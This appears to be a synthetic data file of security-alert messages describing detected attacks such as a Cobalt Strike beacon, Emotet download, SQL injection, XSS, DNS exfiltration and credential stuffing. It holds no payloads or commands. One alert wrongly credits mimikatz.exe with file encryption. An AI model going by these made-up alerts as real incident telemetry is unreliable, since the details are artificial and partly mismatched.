column171: Spyware detected: Cobalt Strike beacon callback to known C2 server

Message: SSH brute force attempt detected - 150 failed login attempts in 60 seconds from single source
Malware download blocked: Win.Trojan.Emotet variant detected in HTTP download from compromised website
Ransomware behavior detected: Mass file encryption observed. Process mimikatz.exe spawned by cmd.exe performing rapid file modification across multiple directories
DNS exfiltration attempt detected: Unusually long DNS queries to suspicious domain encoding data in subdomains
SQL Injection attempt detected in web application: UNION SELECT attack against login form parameter
Credential stuffing attack detected: 5000 unique username/password combinations attempted against authentication endpoint in 10 minutes
Cross-site scripting (XSS) attack detected: Reflected XSS payload in search parameter attempting to steal session cookies
DLP policy violation: Sensitive data (credit card numbers PCI pattern) detected in file upload to unauthorized cloud storage service
Lateral movement detected: Internal host scanning multiple ports on domain controller followed by successful RDP connection
DDoS attack mitigated: SYN flood targeting web server from botnet - 50000 connections per second from distributed sources
